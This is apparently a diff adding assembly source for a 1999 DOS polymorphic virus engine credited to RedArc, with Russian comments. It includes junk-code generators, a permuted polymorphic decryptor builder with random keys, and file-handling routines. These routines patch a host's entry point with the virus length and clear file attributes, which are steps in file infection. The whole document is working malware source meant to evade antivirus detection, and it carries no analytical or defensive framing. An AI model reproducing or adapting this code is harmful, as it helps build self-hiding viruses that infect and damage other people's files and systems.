+     ret
+@MI15 equ $-EntryPoint
+MI15: ;dec R / inc R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     call Dec_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov bl,bh
+     call Inc_Reg16_Tabelle
+     xchg al,bl
+     stosb
+     ret
+@MI16 equ $-EntryPoint
+MI16: ;inc R / dec R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     call Inc_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov bl,bh
+     call Dec_Reg16_Tabelle
+     xchg al,bl
+     stosb
+     ret
+@MI17 equ $-EntryPoint
+MI17: ;int 3h
+     mov al,0cch
+     stosb
+     ret
+@MI18 equ $-EntryPoint
+MI18: ;int 3h
+     mov ax,03cdh
+     stosw
+     ret
+@MI19 equ $-EntryPoint
+MI19: ;int 1h
+     mov ax,01cdh
+     stosw
+     ret
+@MI20 equ $-EntryPoint
+MI20: ;clc / jnc $+2
+     mov al,0f8h
+     stosb
+     call MI_NOP
+     mov ax,0073h
+     stosw
+     ret
+@MI21 equ $-EntryPoint
+MI21: ;push ax / lahf / pop ax
+     mov bl,0
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov al,09fh
+     stosb
+     call MI_MUS
+     mov bl,0
+     call Pop_Reg16_Tabelle
+     xchg bl,al
+     stosb
+     ret
+@MI22 equ $-EntryPoint
+MI22: ;jmps $+3 / V8
+     mov ax,01ebh
+     stosw
+     mov ah,0ffh
+     call RND_Tabelle
+     mov al,ah
+     stosb
+     ret
+@MI23 equ $-EntryPoint
+MI23: ;jmps $+4 / V16
+     mov ax,02ebh
+     stosw
+     call _Calc_Rnd16
+     xchg bx,ax
+     stosw
+     ret
+@MI24 equ $-EntryPoint
+MI24: ;jmp $+4 / V8
+     mov al,0e9h
+     stosb
+     mov ax,01h
+     stosw
+     mov ah,0ffh
+     call RND_Tabelle
+     mov al,ah
+     stosb
+     ret
+@MI25 equ $-EntryPoint
+MI25: ;jmp $+5 / V16
+     mov al,0e9h
+     stosb
+     mov ax,02h
+     stosw
+     call _Calc_Rnd16
+     xchg bx,ax
+     stosw
+     ret
+@MI26 equ $-EntryPoint
+MI26: ;neg R / neg R
+     mov bl,8
+     call _Calc_Rnd_R16
+     add bh,0d8h
+     mov al,0f7h
+     stosb
+     mov al,bh
+     stosb
+     call MI_MUS
+     mov al,0f7h
+     stosb
+     mov al,bh
+     stosb
+     ret
+@MI27 equ $-EntryPoint
+MI27: ;not R / not R
+     mov bl,8
+     call _Calc_Rnd_R16
+     add bh,0d0h
+     mov al,0f7h
+     stosb
+     mov al,bh
+     stosb
+     call MI_MUS
+     mov al,0f7h
+     stosb
+     mov al,bh
+     stosb
+     ret
+@MI28 equ $-EntryPoint
+MI28: ;push R / pop R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov bl,bh
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI29 equ $-EntryPoint
+MI29: ;pusha / popa
+     mov ax,6160h
+     stosw
+     ret
+@MI30 equ $-EntryPoint
+MI30: ;pushf / popf
+     mov ax,9d9ch
+     stosw
+     ret
+@MI31 equ $-EntryPoint
+MI31: ;rol R,1 / ror R,1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     add bl,0c0h
+     mov al,0d1h
+     stosb
+     mov al,bl
+     stosb
+     mov bl,bh
+     call MI_MUS
+     add bl,0c8h
+     mov al,0d1h
+     stosb
+     mov al,bl
+     stosb
+     ret
+@MI32 equ $-EntryPoint
+MI32: ;ror R,1 / rol R,1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     add bl,0c8h
+     mov al,0d1h
+     stosb
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov bl,bh
+     add bl,0c0h
+     mov al,0d1h
+     stosb
+     mov al,bl
+     stosb
+     ret
+@MI33 equ $-EntryPoint
+MI33: ;push ax / lahf / sahf / pop ax
+     mov bx,0
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov ax,09e9fh
+     stosw
+     call MI_MUS
+     mov bx,0
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI34 equ $-EntryPoint
+MI34: ;push R / call $+4 / V8 / pop R / pop R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_NOP
+     mov al,0e8h
+     stosb
+     mov ax,1
+     stosw
+     mov ah,0ffh
+     call RND_Tabelle
+     mov al,ah
+     stosb
+     mov bl,bh
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_NOP
+     mov bl,bh
+     call Pop_Reg16_Tabelle
+     xchg bl,al
+     stosb
+     ret
+@MI35 equ $-EntryPoint
+MI35: ;stc / clc
+     mov ax,0f8f9h
+     stosw
+     ret
+@MI36 equ $-EntryPoint
+MI36: ;stc / jc $+2
+     mov al,0f9h
+     stosb
+     mov ax,072h
+     stosw
+     ret
+@MI37 equ $-EntryPoint
+MI37: ;test R,V16
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     add bl,0c0h
+     mov al,0f7h
+     stosb
+     mov al,bl
+     stosb
+     call _Calc_Rnd16
+     xchg bx,ax
+     stosw
+     ret
+@MI38 equ $-EntryPoint
+MI38: ;xchg R,R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     call Xchg_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     ret
+@MI39 equ $-EntryPoint
+MI39: ;xchg R1,R2 / xchg R2,R1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Xchg_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_NOP
+     pop bx
+     xchg bh,bl
+     call Xchg_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     ret
+@MI40 equ $-EntryPoint
+MI40: ;push R / xor R,V16 / pop R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     call _Calc_Rnd16
+     xchg bx,ax
+     pop bx
+     push bx
+     call Xor_Reg16_Value16_Tabelle
+     call _ax_bx
+     call MI_MUS
+     pop bx
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI41 equ $-EntryPoint
+MI41: ;push R1 / xor R1/R2 / pop R1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     pop bx
+     push bx
+     call Xor_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_MUS
+     pop bx
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI42 equ $-EntryPoint
+MI42: ;add R,V16 / sub R,V16
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     push bx
+     call _Calc_Rnd16
+     xchg bx,ax
+     pop bx
+     push bx
+     push ax
+     call Add_Reg16_Value16_Tabelle
+     call _ax_bx
+     call MI_MUS
+     pop ax
+     pop bx
+     call Sub_Reg16_Value16_Tabelle
+     call _ax_bx
+     ret
+@MI43 equ $-EntryPoint
+MI43: ;sub R,V16 / add R,V16
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     push bx
+     call _Calc_Rnd16
+     xchg bx,ax
+     pop bx
+     push bx
+     push ax
+     call Sub_Reg16_Value16_Tabelle
+     call _ax_bx
+     call MI_MUS
+     pop ax
+     pop bx
+     call Add_Reg16_Value16_Tabelle
+     call _ax_bx
+     ret
+@MI44 equ $-EntryPoint
+MI44: ;add R1,R2 / sub R1,R2
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Add_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_MUS
+     pop bx
+     call Sub_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     ret
+@MI45 equ $-EntryPoint
+MI45: ;sub R1,R2 / add R1,R2
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Sub_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     pop bx
+     call MI_MUS
+     call Add_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     ret
+@MI46 equ $-EntryPoint
+MI46: ;push R / mov R,V16 / pop R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     call _Calc_Rnd16
+     xchg bx,ax
+     pop bx
+     push bx
+     mov bl,bh
+     call Mov_Reg16_Value16_Tabelle
+     call _al_bx
+     call MI_MUS
+     pop bx
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI47 equ $-EntryPoint
+MI47: ;push R1 / mov R1,R2 / pop R1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     pop bx
+     push bx
+     call Mov_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_MUS
+     pop bx
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI48 equ $-EntryPoint
+MI48: ;push R1 / add R1,R2 / pop R1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     pop bx
+     push bx
+     call Add_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_MUS
+     pop bx
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI49 equ $-EntryPoint
+MI49: ;push R1 / sub R1,R2 / pop R1
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     pop bx
+     push bx
+     call Sub_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_MUS
+     pop bx
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     ret
+@MI50 equ $-EntryPoint
+MI50: ;push R1 / mov R1,R2 / pop R2 / xchg R1,R2
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov al,bh
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,al
+     push bx
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_NOP
+     pop bx
+     push bx
+     call Mov_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     call MI_NOP
+     pop bx
+     push bx
+     xchg bh,bl
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_NOP
+     pop bx
+     call Xchg_Reg1_Reg2_16_Tabelle
+     xchg bx,ax
+     stosw
+     ret
+@MI51 equ $-EntryPoint
+MI51: ;нет мусора
+     ret
+;--
+; Диспетчер случайно вставляемых/невставляемых nop'ов в сложные команды
+MI_NOP:
+     push ax cx
+     mov ah,3
+     call RND_Tabelle
+     cmp ah,0
+     je MI_NOP_1
+     mov cl,ah
+MI_NOP_0:
+     call MI1
+     loop MI_NOP_0
+MI_NOP_1:
+     pop cx ax
+     ret
+;---
+; Диспетчер случайно вставляемых/невставляемых мусорных команд в мусор
+MI_MUS:
+     push ax bx cx dx
+     mov ah,5
+     call RND_Tabelle
+     cmp ah,0
+     je MI_MUS_E
+MI_MUS_1:
+     cmp ah,1
+     jne MI_MUS_2
+     call MI1
+     jmp short MI_MUS_E
+MI_MUS_2:
+     cmp ah,2
+     jne MI_MUS_3
+     call MI2
+     jmp short MI_MUS_E
+MI_MUS_3:
+     cmp ah,3
+     jne MI_MUS_4
+     call MI3
+     jmp short MI_MUS_E
+MI_MUS_4:
+     cmp ah,4
+     jne MI_MUS_5
+     call MI9
+     jmp short MI_MUS_E
+MI_MUS_5:
+     call MI50
+MI_MUS_E:
+     pop dx cx bx ax
+     ret
+;------------------------------------
+;Диспетчер однобайтового мусора
+Musor1:
+     push ax bx cx dx si
+     mov ax,@MII_A
+     add ax,bp
+     push ax
+     mov ah,0bh
+     call RND_Tabelle
+     sub al,al
+     xchg ah,al
+     shl ax,1
+     lea si,[bp+TabelleMusor1]
+     add si,ax
+     mov ax,word ptr ds:[si]
+     add ax,bp
+     push ax
+     ret
+@MII_A equ $-EntryPoint
+MII_A:
+     pop si dx cx bx ax
+     ret
+;---
+TabelleMusor1 equ $-EntryPoint
+  dw @M1, @M2, @M3, @M4, @M5, @M6, @M7, @M8, @M9, @Ma, @M1
+;---
+
+@M1 equ $-EntryPoint
+@MII1: ;nop
+     mov al,90h
+     stosb
+     ret
+@M2 equ $-EntryPoint
+@MII2: ;cld
+     mov al,0fch
+     stosb
+     ret
+@M3 equ $-EntryPoint
+@MII3: ;sti
+     mov al,0fbh
+     stosb
+     ret
+@M4 equ $-EntryPoint
+@MII4: ;clc
+     mov al,0f8h
+     stosb
+     ret
+@M5 equ $-EntryPoint
+@MII5: ;int 3h
+     mov al,0cch
+     stosb
+     ret
+@M6 equ $-EntryPoint
+@MII6: ;fs:
+     mov al,064h
+     stosb
+     ret
+@M7 equ $-EntryPoint
+@MII7: ;gs:
+     mov al,065h
+     stosb
+     ret
+@M8 equ $-EntryPoint
+@MII8: ;ds:
+     mov al,067h
+     stosb
+     ret
+@M9 equ $-EntryPoint
+@MII9: ;cs:
+     mov al,02eh
+     stosb
+     ret
+@Ma equ $-EntryPoint
+@MIIa: ;es:
+     mov al,026h
+     stosb
+     ret
+;------------------------------------
+include code16.inc
+===== end   musor.inc =====
+
+===== begin permut.inc =====
+;Процедуры для пермутации (c) 1999 by RedArc
+
+;--- Запись перехода-пустышки.
+Jump:
+    push ax bx
+    call _Calc_Rnd16
+    mov al,0e9h
+    stosb
+    xchg bx,ax
+    stosw
+    pop bx ax
+    ret
+
+;--- Получение состояния флага для блока
+;Input:  al - block
+;Output: al - range
+Get_Flag:
+    push si bx
+    mov bx,ax
+    lea si,[bp+TabelleFlags]
+    mov ah,0
+    add si,ax
+    mov al,byte ptr ds:[si]
+    mov bl,al
+    xchg bx,ax
+    pop bx si
+    ret
+
+;--- Выставление флага для блока
+;Input:  al - block
+;Output: none
+Put_Flag:
+    push ax si
+    mov ah,0
+    lea si,[bp+TabelleFlags]
+    add si,ax
+    mov byte ptr ds:[si],1
+    pop si ax
+    ret
+
+;--- Калькуляция перехода
+;Input:  si - адрес метки для перехода
+;        di - адрес команды перехода
+;        bx - адрес начала буфера
+;Output: none
+CalcJump:
+         push ax bx cx dx
+         mov ax,di
+         mov dx,si
+         sub ax,bx
+         sub dx,bx
+         cmp ax,dx
+         jl JumpDown
+JumpUp:
+         mov cx,0ffffh
+         sub ax,dx
+         sub cx,ax
+         sub cx,2
+         xchg dx,cx
+         jmp FormJump
+JumpDown:
+         add ax,3
+         sub dx,ax
+FormJump:
+         mov word ptr ds:[di+1],dx
+         pop dx cx bx ax
+         ret
+===== end   permut.inc =====
+
+===== begin poly.inc =====
+;Калькуляция полидекриптора (c) 1999 by RedArc
+
+;---
+IndexBuff equ 76*2            ;Смещение индексного буфера
+BlockOffset equ TabelleFlags  ;Смещение буфера флагов
+;---
+
+CalcPoly:
+          push ax bx cx dx si
+;Обнуление флагов
+          lea si,[bp+TabelleFlags]
+          mov cx,11
+          xor ax,ax
+CP1:
+          mov word ptr ds:[si],ax
+          add si,2
+          loop CP1
+;Калькуляция новых ключей шифровки
+          call _Calc_Rnd16
+          mov word ptr ds:[bp+TabelleKeys],bx
+          call _Calc_Rnd16
+          mov word ptr ds:[bp+TabelleKeys+2],bx
+          call _Calc_Rnd16
+          mov word ptr ds:[bp+TabelleKeys+4],bx
+;Выбор случайного блока, его калькуляция, выставление флага и запоминание констант
+          mov cx,14
+@CPa:
+          push cx
+          lea ax,[bp+@CP2]
+          push ax
+@CP0:
+          mov ah,14
+          call RND_Tabelle
+          cmp ah,14
+          je @CP0
+          mov al,ah
+          call Get_Flag
+          cmp al,0
+          jne @CP0
+          xchg ah,al
+          call Put_Flag
+          shl ax,1
+          lea si,[bp+TabellePoly]
+          add si,ax
+          mov ax,word ptr ds:[si]
+          add ax,bp
+          push ax
+          ret
+@CP2 equ $-EntryPoint
+CP2:
+          pop cx
+          dec cx
+          cmp cx,1
+          je CP3
+          jmp @CPa
+CP3:
+          lea si,[bp+TabelleFlags]
+          mov cx,0
+CP4:
+          lodsb
+          cmp al,0
+          je CP5
+          inc cx
+          jmp short CP4
+CP5:
+          lea ax,[bp+@CP6]
+          push ax
+          xchg cx,ax
+          shl ax,1
+          lea si,[bp+TabellePoly]
+          add si,ax
+          mov ax,word ptr ds:[si]
+          add ax,bp
+          push ax
+          ret
+@CP6 equ $-EntryPoint
+CP6:
+; Калькуляция адресов переходов
+          lea bx,[bp+Buffer]
+          push di
+;---
+          mov si,word ptr ds:[bp-IndexBuff+4]
+          mov di,word ptr ds:[bp-IndexBuff+2]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+10]
+          mov di,word ptr ds:[bp-IndexBuff+8]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+16]
+          mov di,word ptr ds:[bp-IndexBuff+14]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+22]
+          mov di,word ptr ds:[bp-IndexBuff+20]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+28]
+          mov di,word ptr ds:[bp-IndexBuff+26]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+34]
+          mov di,word ptr ds:[bp-IndexBuff+32]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+40]
+          mov di,word ptr ds:[bp-IndexBuff+38]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+44]
+          mov di,word ptr ds:[bp-IndexBuff+42]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+48]
+          mov di,word ptr ds:[bp-IndexBuff+46]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+52]
+          mov di,word ptr ds:[bp-IndexBuff+50]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+52]
+          mov di,word ptr ds:[bp-IndexBuff+50]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+56]
+          mov di,word ptr ds:[bp-IndexBuff+54]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+60]
+          mov di,word ptr ds:[bp-IndexBuff+58]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+44]
+          mov di,word ptr ds:[bp-IndexBuff+68]
+          call CalcJump
+;---
+          mov si,word ptr ds:[bp-IndexBuff+74]
+          mov di,word ptr ds:[bp-IndexBuff+72]
+          call CalcJump
+;Калькуляция прочих адресов
+          pop di
+          push bx
+          mov ax,di
+          sub ax,bx
+          mov cx,word ptr ds:[bp+DTA_NEW+1ah]
+          add ax,cx
+          inc ah  ;В регистре AX новый адрес EntryPoint
+          mov si,word ptr ds:[bp-IndexBuff+6]
+          mov word ptr ds:[si],ax
+;---
+          mov si,word ptr ds:[bp-IndexBuff+30]
+          mov word ptr ds:[si+1],ax
+;---
+          pop bx
+          mov ax,word ptr ds:[bp-IndexBuff+28]
+          sub ax,bx
+          add ax,cx
+          inc ah ;В регистре AX адрес метки L1
+          mov si,word ptr ds:[bp-IndexBuff+12]
+          mov word ptr ds:[si],ax
+;---
+          mov si,word ptr ds:[bp-IndexBuff+18]
+          mov word ptr ds:[si],ax
+;---
+          mov ax,word ptr ds:[bp+TabelleKeys]
+          mov si,word ptr ds:[bp-IndexBuff+24]
+          mov word ptr ds:[si+1],ax ;StartKey
+;---
+          mov ax,word ptr ds:[bp+TabelleKeys+2]
+          mov si,word ptr ds:[bp-IndexBuff+64]
+          mov word ptr ds:[si],ax ;LoopKey
+;---
+          mov ax,word ptr ds:[bp+TabelleKeys+4]
+          mov si,word ptr ds:[bp-IndexBuff+76]
+          mov word ptr ds:[si],ax ;EndKey
+;---
+;Выход
+          pop si dx cx bx ax
+          ret
+;---
+TabellePoly equ $-EntryPoint
+  dw PB1, PB2, PB3,  PB4,  PB5,  PB6,  PB7
+  dw PB8, PB9, PB10, PB11, PB12, PB13, PB14
+TabelleFlags equ $-EntryPoint
+  db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+TabelleKeys equ $-EntryPoint
+;    StartKey LoopKey EndKey StatKey Reserved
+  dw 0,       0,      0,     0,      0
+;---
+PB1 equ $-EntryPoint
+PBlock1: ;Сохранение регистров и точки возврата
+       mov word ptr ds:[bp-IndexBuff],di
+       call Musor
+       mov al,068h
+       stosb
+       mov ax,word ptr ds:[bp+JMP_OFS] ;Смещение команды перехода
+       stosw
+       call Musor
+       mov al,09ch
+       stosb
+       call Musor
+       mov al,060h
+       stosb
+       call Musor
+       mov al,01eh
+       stosb
+       call Musor
+       mov al,06h
+       stosb
+       call Musor
+       mov al,0eh
+       stosb
+       call Musor
+       mov al,0eh
+       stosb
+       call Musor
+       mov al,01fh
+       stosb
+       call Musor
+       mov al,007h
+       stosb
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+2],di
+       call Jump
+       call Musor
+       ret
+;---
+PB2 equ $-EntryPoint ;push offset EntryPoint / jmp @a
+PBlock2:
+       mov word ptr ds:[bp-IndexBuff+4],di
+       call Musor
+       mov al,068h
+       stosb
+       mov word ptr ds:[bp-IndexBuff+6],di
+       mov ax,1234h ;Адрес перехода после дешифровки
+       stosw
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+8],di
+       call Jump
+       call Musor
+       ret
+;---
+PB3 equ $-EntryPoint ;push offset L1 / jmp @b
+PBlock3:
+       mov word ptr ds:[bp-IndexBuff+10],di
+       call Musor
+       mov al,068h
+       stosb
+       mov word ptr ds:[bp-IndexBuff+12],di
+       mov ax,1234h ;Адрес начала цикла
+       stosw
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+14],di
+       call Jump
+       call Musor
+       ret
+;---
+PB4 equ $-EntryPoint ;push offset L1 / jmp @c
+PBlock4:
+       mov word ptr ds:[bp-IndexBuff+16],di
+       call Musor
+       mov al,068h
+       stosb
+       mov word ptr ds:[bp-IndexBuff+18],di
+       mov ax,1234h ;Адрес начала цикла
+       stosw
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+20],di
+       call Jump
+       call Musor
+       ret
+;---
+PB5 equ $-EntryPoint ;mov bx,1234h / jmp L1
+PBlock5:
+       mov word ptr ds:[bp-IndexBuff+22],di
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+24],di
+       mov bl,3
+       mov ax,1234h
+       call Mov_Reg16_Value16_Tabelle
+       call _al_bx
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+26],di
+       call Jump
+       call Musor
+       ret
+;---
+PB6 equ $-EntryPoint ;mov si,offset EntryPoint / jmp @d
+PBlock6:
+       mov word ptr ds:[bp-IndexBuff+28],di
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+30],di
+       mov bl,6
+       mov ax,1234h
+       call Mov_Reg16_Value16_Tabelle
+       call _al_bx
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+32],di
+       call Jump
+       call Musor
+       ret
+;---
+PB7 equ $-EntryPoint ;mov cx,VirLength/2 / jmp @e
+PBlock7:
+       mov word ptr ds:[bp-IndexBuff+34],di
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+36],di
+       mov ax,Virlength / 2
+       mov bl,1
+       call Mov_Reg16_Value16_Tabelle
+       call _al_bx
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+38],di
+       call Jump
+       call Musor
+       ret
+;---
+PB8 equ $-EntryPoint ;mov di,si / jmp L2
+PBlock8:
+       mov word ptr ds:[bp-IndexBuff+40],di
+       call Musor
+       mov bl,7
+       mov bh,6
+       call Mov_Reg1_Reg2_16_Tabelle
+       xchg bx,ax
+       stosw
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+42],di
+       call Jump
+       call Musor
+       ret
+;---
+PB9 equ $-EntryPoint ;lodsw / jmp @f
+PBlock9:
+       mov word ptr ds:[bp-IndexBuff+44],di
+       call Musor
+       mov al,0adh
+       stosb
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+46],di
+       call Jump
+       call Musor
+       ret
+;---
+PB10 equ $-EntryPoint ;xor ax,bx / jmp @g
+PBlock10:
+       mov word ptr ds:[bp-IndexBuff+48],di
+       call Musor
+       mov bl,0
+       mov bh,3
+       call Xor_Reg1_Reg2_16_Tabelle
+       xchg bx,ax
+       stosw
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+50],di
+       call Jump
+       call Musor
+       ret
+;---
+PB11 equ $-EntryPoint ;stosw / jmp @h
+PBlock11:
+       mov word ptr ds:[bp-IndexBuff+52],di
+       call Musor
+       mov al,0ABh
+       stosb
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+54],di
+       call Jump
+       call Musor
+       ret
+;---
+PB12 equ $-EntryPoint ;dec cx / jmp @i
+PBlock12:
+       mov word ptr ds:[bp-IndexBuff+56],di
+       call Musor
+       mov al,049h
+       stosb
+       call Musor
+       mov word ptr ds:[bp-IndexBuff+58],di
+       call Jump
+       call Musor
+       ret
+;---
+PB13 equ $-EntryPoint ;cmp cx,0 / je @i1 / xor bx,1234h / jmp 200h / jmp 300h
+PBlock13:
+       mov word ptr ds:[bp-IndexBuff+60],di
+       call Musor
+       mov ax,0f983h
+       stosw
+       mov al,0
+       stosb
+       mov ax,00A74h
+       stosw
+       call Musor1
+       mov ax,0f381h
+       stosw
+       mov word ptr ds:[bp-IndexBuff+64],di
+       mov ax,1234h
+       stosw
+       call Musor1
+       mov word ptr ds:[bp-IndexBuff+68],di
+       call Jump
+       call Musor1
+       mov word ptr ds:[bp-IndexBuff+72],di
+       call Jump
+       call Musor
+       ret
+;---
+PB14 equ $-EntryPoint ;xor bx,4321h / ret
+PBlock14:
+       mov word ptr ds:[bp-IndexBuff+74],di
+       call Musor
+       mov ax,0f381h
+       stosw
+       mov word ptr ds:[bp-IndexBuff+76],di
+       mov ax,1234h
+       stosw
+       call Musor
+       mov al,0c3h
+       stosb
+       call Musor
+       ret
+===== end   poly.inc =====
+
+===== begin service.inc =====
+;Сервисные операции (c) 1999 by RedArc
+
+;---
+GoToBegin:
+       mov ax,4200h
+       sub cx,cx
+       int IntConst ;Уходим на найденное место в файле
+       ret
+;---
+GoToEnd:
+       sub dx,dx
+       sub cx,cx
+       mov ax,4202h
+       int IntConst ;Уходим в конец файла
+       ret
+;---
+SetFAttr:
+       lea dx,[bp+DTA_NEW+1eh]
+       mov ax,4301h
+       int IntConst ;Очищаем атрибуты файла
+       ret
+;---
+ZerroBuffer:
+       push ax cx di
+       mov cx,IndexBuff
+       lea di,[bp-IndexBuff]
+       xor ax,ax
+       cld
+       rep stosb
+       pop di cx ax
+       ret
+;---
+===== end   service.inc =====
